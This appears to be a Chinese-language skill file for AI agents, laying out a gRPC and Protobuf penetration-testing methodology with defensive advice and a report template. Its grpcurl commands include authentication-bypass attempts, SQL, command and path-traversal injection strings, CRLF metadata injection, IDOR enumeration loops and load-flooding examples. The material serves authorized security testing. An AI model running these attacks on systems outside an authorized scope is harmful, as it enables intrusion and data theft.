---
name: grpc-security-testing
description: gRPC和Protobuf安全测试专项技能，覆盖gRPC反射枚举、Protobuf反序列化、消息篡改、TLS配置错误、流式RPC测试等微服务特有攻击面
metadata:
  version: 1.0.0
  categories: [api-testing, microservices, protocol-security]
  requires_tools: []
---

# gRPC Security Testing

## 使用边界与发散原则

- 本 skill 是最低覆盖要求、风险清单和证据标准，不是唯一测试路径或固定脚本。执行时必须根据目标技术栈、入口形态、认证状态、业务流程、已有证据、WAF/限速和授权范围调整方法。
- 文中的步骤、payload、命令、工具名和执行顺序默认是候选方法；除非本 skill、系统提示或后端门禁明确写为“必须/禁止/强制”，不要照抄固定列表，也不要因为示例没覆盖某个旁路、协议、参数位置、文件格式或业务入口就跳过。
- 发现阶段的字符串、端点、token、id、报错、组件名和扫描命中只作为候选信号；先记录和复核，不要仅凭单个关键词直接认定漏洞或加载多个无关专项流程。只有交互证据、可复现行为或明确进入对应专项测试时，才提升为专项验证。
- 每一步都应输出证据、判断理由和下一步分支；工具失败时先修参数、配置、环境或改用更合适的专业工具，确认无法覆盖时再使用通用命令兜底。
- 授权范围、低噪声、数据最小化、复现证据、误报排除和报告要求是硬边界；这些约束高于任何示例命令或默认流程。

## 概述

gRPC是Google开发的高性能RPC框架，广泛用于微服务架构。基于HTTP/2和Protocol Buffers，gRPC的安全测试与传统REST API有本质区别。

**gRPC特有风险**：
- gRPC反射暴露服务定义
- Protobuf反序列化漏洞
- 元数据（Metadata）注入
- 流式RPC资源耗尽
- TLS配置错误
- 缺少速率限制

---

## gRPC基础

### 架构组成

```
客户端 → HTTP/2 → gRPC服务器
         ↓
    Protocol Buffers (序列化)
         ↓
    服务端处理逻辑
```

### 服务定义示例

```protobuf
// user.proto
syntax = "proto3";

package user;

service UserService {
  rpc GetUser (GetUserRequest) returns (User) {}
  rpc CreateUser (CreateUserRequest) returns (User) {}
  rpc ListUsers (ListUsersRequest) returns (stream User) {}  // 流式响应
  rpc UpdateUserStream (stream UpdateUserRequest) returns (User) {}  // 流式请求
}

message GetUserRequest {
  string user_id = 1;
}

message User {
  string user_id = 1;
  string name = 2;
  string email = 3;
  string role = 4;
}
```

### RPC类型

| 类型 | 说明 |
|------|------|
| Unary | 单请求→单响应 |
| Server Streaming | 单请求→流式响应 |
| Client Streaming | 流式请求→单响应 |
| Bidirectional Streaming | 双向流式 |

---

## 测试流程

### 阶段1：gRPC端点发现

#### 1.1 端口识别

```markdown
常见gRPC端口：
- 50051 (默认)
- 9090
- 8080 (HTTP/2)
- 443 (HTTPS with HTTP/2)
```

#### 1.2 HTTP/2识别

```bash
# 使用curl检测HTTP/2
curl --http2 -v https://target.com:50051

# 响应包含
# < HTTP/2 200
# < content-type: application/grpc

# 或使用nmap
nmap -p 50051 --script http2-detect target.com
```

#### 1.3 gRPC特征

```markdown
HTTP/2特征：
- Content-Type: application/grpc
- Content-Type: application/grpc+proto
- Headers中包含grpc-*字段

gRPC错误响应：
- grpc-status: 12 (UNIMPLEMENTED)
- grpc-message: Method not found
```

---

### 阶段2：服务枚举 (gRPC Reflection)

#### 2.1 反射协议

gRPC Server Reflection Protocol允许客户端查询服务定义，类似GraphQL的Introspection。

**使用grpcurl工具**：

```bash
# 安装grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# 1. 列出所有服务
grpcurl -plaintext target.com:50051 list

# 输出示例：
# user.UserService
# admin.AdminService
# grpc.reflection.v1alpha.ServerReflection

# 2. 查看特定服务的方法
grpcurl -plaintext target.com:50051 list user.UserService

# 输出：
# user.UserService.GetUser
# user.UserService.CreateUser
# user.UserService.ListUsers

# 3. 查看方法的请求/响应结构
grpcurl -plaintext target.com:50051 describe user.UserService.GetUser

# 输出：
# user.UserService.GetUser is a method:
# rpc GetUser ( .user.GetUserRequest ) returns ( .user.User );
```

#### 2.2 反射被禁用时的绕过

```markdown
方法1：查找.proto文件
- 前端代码中的proto文件
- GitHub搜索目标公司的proto定义
- 公开的API文档

方法2：Protobuf逆向
- 抓取gRPC通信包
- 使用Wireshark解析Protobuf
- 工具：protobuf-inspector, blackboxprotobuf

方法3：错误信息枚举
- 发送畸形请求
- 从错误消息推断字段名和类型
```

---

### 阶段3：认证与授权测试

#### 3.1 Metadata认证绕过

gRPC使用Metadata传递认证信息（类似HTTP Header）。

```bash
# 1. 无认证测试
grpcurl -plaintext target.com:50051 user.UserService/GetUser

# 2. 添加认证metadata
grpcurl -plaintext \
  -H "authorization: Bearer token123" \
  target.com:50051 user.UserService/GetUser

# 3. 测试常见认证绕过
# 空token
grpcurl -H "authorization: Bearer " target.com:50051 ...

# 无效token
grpcurl -H "authorization: Bearer invalid" target.com:50051 ...

# 过期token
grpcurl -H "authorization: Bearer expired_token" target.com:50051 ...

# 其他用户token
grpcurl -H "authorization: Bearer other_user_token" target.com:50051 ...
```

#### 3.2 权限测试

```bash
# 使用普通用户token调用管理员方法
grpcurl -plaintext \
  -H "authorization: Bearer user_token" \
  -d '{"user_id": "admin"}' \
  target.com:50051 admin.AdminService/DeleteAllUsers

# 测试横向越权
grpcurl -plaintext \
  -H "authorization: Bearer user1_token" \
  -d '{"user_id": "user2"}' \
  target.com:50051 user.UserService/GetUser
```

---

### 阶段4：输入验证与注入

#### 4.1 Protobuf消息篡改

```bash
# 正常请求
grpcurl -plaintext \
  -d '{"user_id": "123"}' \
  target.com:50051 user.UserService/GetUser

# 注入测试
# SQL注入
grpcurl -d '{"user_id": "123\" OR \"1\"=\"1"}' ...

# 命令注入
grpcurl -d '{"user_id": "123; whoami"}' ...

# 路径遍历
grpcurl -d '{"user_id": "../../../admin"}' ...

# XSS (如果响应显示在Web界面)
grpcurl -d '{"name": "<script>alert(1)</script>"}' ...
```

#### 4.2 整数溢出

```bash
# 测试边界值
grpcurl -d '{"limit": 9999999999}' ...  # 极大值
grpcurl -d '{"limit": -1}' ...          # 负数
grpcurl -d '{"price": 0}' ...           # 零值
```

#### 4.3 类型混淆

Protobuf支持多种类型，某些实现可能处理不当：

```protobuf
// 定义
message Request {
  int32 user_id = 1;
}

// 测试
{"user_id": "string_instead_of_int"}  // 类型不匹配
{"user_id": 2147483648}  # 超出int32范围
```

---

### 阶段5：业务逻辑漏洞

#### 5.1 IDOR测试

```bash
# 枚举user_id
for id in {1..1000}; do
  grpcurl -plaintext -d "{\"user_id\": \"$id\"}" \
    target.com:50051 user.UserService/GetUser
done

# 批量请求（如果支持）
grpcurl -d '{
  "requests": [
    {"user_id": "1"},
    {"user_id": "2"},
    {"user_id": "3"}
  ]
}' ...
```

#### 5.2 竞态条件

```bash
# 并发创建相同资源
for i in {1..10}; do
  grpcurl -d '{"username": "admin"}' ... &
done
wait

# 或使用专用工具
ghz --insecure \
  --proto user.proto \
  --call user.UserService/CreateUser \
  -d '{"username": "admin"}' \
  -n 100 \
  -c 10 \
  target.com:50051
```

---

### 阶段6：流式RPC测试

#### 6.1 Server Streaming测试

```bash
# 正常流式响应
grpcurl -plaintext \
  -d '{"limit": 10}' \
  target.com:50051 user.UserService/ListUsers

# 测试：请求大量数据
grpcurl -d '{"limit": 999999}' ...

# 测试：不关闭连接
# 观察服务器是否正确处理长连接
```

#### 6.2 Client Streaming测试

```bash
# 客户端流式发送大量数据
# 测试服务器是否有缓冲区限制
```

---

### 阶段7：TLS与传输安全

#### 7.1 TLS配置测试

```bash
# 1. 测试是否强制TLS
grpcurl -plaintext target.com:50051 list
# 如果成功，说明未强制加密

# 2. 测试TLS版本
nmap --script ssl-enum-ciphers -p 50051 target.com

# 3. 测试证书验证
grpcurl -insecure target.com:50051 list
# -insecure跳过证书验证，生产环境不应成功
```

#### 7.2 证书劫持

```markdown
测试场景：
1. 客户端是否验证服务器证书
2. 是否接受自签名证书
3. 是否检查证书域名
```

---

### 阶段8：Metadata注入

gRPC的Metadata类似HTTP Header，可能存在注入漏洞。

```bash
# Header注入（CRLF）
grpcurl -H "custom-header: value\r\ninjected-header: evil" ...

# 超长header
grpcurl -H "custom-header: $(python -c 'print("A"*100000)')" ...

# 特殊字符
grpcurl -H "custom-header: \x00\x01\x02" ...
```

---

## 专用工具

### grpcurl

```bash
# 基础使用
grpcurl [选项] <host:port> <service/method>

# 常用选项
-plaintext          # 禁用TLS
-insecure           # 跳过证书验证
-H "key: value"     # 添加metadata
-d '{"key": "val"}' # 请求数据（JSON格式）
-proto file.proto   # 指定proto文件（无反射时）
-import-path ./     # proto导入路径
```

### grpcui

```bash
# 启动Web界面
grpcui -plaintext target.com:50051

# 浏览器访问 http://localhost:8080
# 提供类似Postman的图形界面测试gRPC
```

### ghz (gRPC性能测试)

```bash
# 压力测试
ghz --insecure \
  --proto user.proto \
  --call user.UserService/GetUser \
  -d '{"user_id": "123"}' \
  -n 10000 \  # 总请求数
  -c 100 \    # 并发数
  target.com:50051
```

### Burp Suite插件

```markdown
安装：BurpSuite → Extender → BApp Store → gRPC

功能：
- 拦截gRPC请求
- 修改Protobuf消息
- 重放攻击
```

---

## Protobuf安全

### 反序列化漏洞

```markdown
风险：
- 某些语言的Protobuf实现存在反序列化漏洞
- 恶意构造的Protobuf消息导致代码执行

测试：
1. 发送超大消息
2. 嵌套深度极大的消息
3. 重复字段大量重复
```

### 消息格式

```protobuf
// Protobuf wire format
message Test {
  int32 a = 1;    // field number 1
  string b = 2;   // field number 2
}

// 二进制格式：[field_number | wire_type] [value]
```

---

## 实战案例

### 案例1：gRPC反射泄露管理员接口

**发现**：

```bash
$ grpcurl -plaintext target.com:50051 list
user.UserService
admin.AdminService  # 未公开的管理员服务
internal.DebugService
```

**利用**：

```bash
# 枚举admin服务方法
$ grpcurl -plaintext target.com:50051 list admin.AdminService
admin.AdminService.DeleteAllUsers
admin.AdminService.ExportUserData

# 未授权调用
$ grpcurl -plaintext \
  -d '{}' \
  target.com:50051 admin.AdminService/ExportUserData
# 成功导出所有用户数据
```

### 案例2：Metadata认证绕过

**发现**：服务器通过metadata的`user-id`字段识别用户

```bash
# 正常请求
grpcurl -H "user-id: 123" ...

# 篡改user-id
grpcurl -H "user-id: 1" ...  # admin的ID
# 成功获取admin权限
```

### 案例3：整数溢出导致免费购买

```bash
# 正常购买
grpcurl -d '{"product_id": "123", "quantity": 1, "price": 100}' ...

# 整数溢出
grpcurl -d '{"product_id": "123", "quantity": -1, "price": 100}' ...
# 服务器计算 total = -1 * 100 = -100
# 账户余额增加100
```

---

## 输出报告模板

```markdown
# gRPC安全测试报告

## 目标
- 端点: target.com:50051
- 框架: gRPC (Go实现)
- 传输: HTTP/2 over TLS

## 服务发现
- 总服务数: 5
- 总方法数: 23
- 敏感服务: admin.AdminService, internal.DebugService

## 漏洞发现

### [严重] gRPC反射暴露内部服务
**描述**: 生产环境启用gRPC反射

**影响**:
- 攻击者枚举所有服务和方法
- 发现未公开的admin和debug接口

**PoC**:
\`\`\`bash
grpcurl -plaintext target.com:50051 list
# 输出包含 internal.DebugService
\`\`\`

**修复**:
\`\`\`go
// Go代码
// 生产环境移除反射注册
// reflection.Register(grpcServer)  // 注释掉
\`\`\`

### [高危] 未强制TLS加密
**描述**: 允许明文gRPC连接

**影响**: 中间人窃听敏感数据

**PoC**:
\`\`\`bash
grpcurl -plaintext target.com:50051 user.UserService/GetUser
# 成功建立明文连接
\`\`\`

**修复**: 强制TLS，拒绝plaintext连接

### [中危] 缺少速率限制
**描述**: 可无限调用API

**PoC**:
\`\`\`bash
# 10000次请求无限制
for i in {1..10000}; do grpcurl ...; done
\`\`\`

**修复**: 实施per-client速率限制

## 建议
1. 生产环境禁用gRPC反射
2. 强制TLS 1.2+
3. 实施metadata验证和速率限制
4. 审计admin和internal服务的访问控制
```

---

## 防御建议

### ✅ DO

- **生产环境禁用反射**
- **强制TLS加密**（拒绝plaintext）
- **严格验证metadata**（认证信息）
- **输入验证**（Protobuf字段）
- **实施速率限制**
- **流式RPC设置超时和大小限制**
- **记录所有gRPC调用**（审计日志）

### ❌ DON'T

- 不要在生产环境启用反射
- 不要信任客户端的metadata（如user-id）
- 不要忽略TLS证书验证
- 不要允许无限大的消息
- 不要在错误消息中暴露敏感信息

---

## 参考资料

- [gRPC Security Guide](https://grpc.io/docs/guides/auth/)
- [gRPC Reflection Protocol](https://github.com/grpc/grpc/blob/master/doc/server-reflection.md)
- [Protobuf Security](https://developers.google.com/protocol-buffers/docs/security)
- [grpcurl Documentation](https://github.com/fullstorydev/grpcurl)
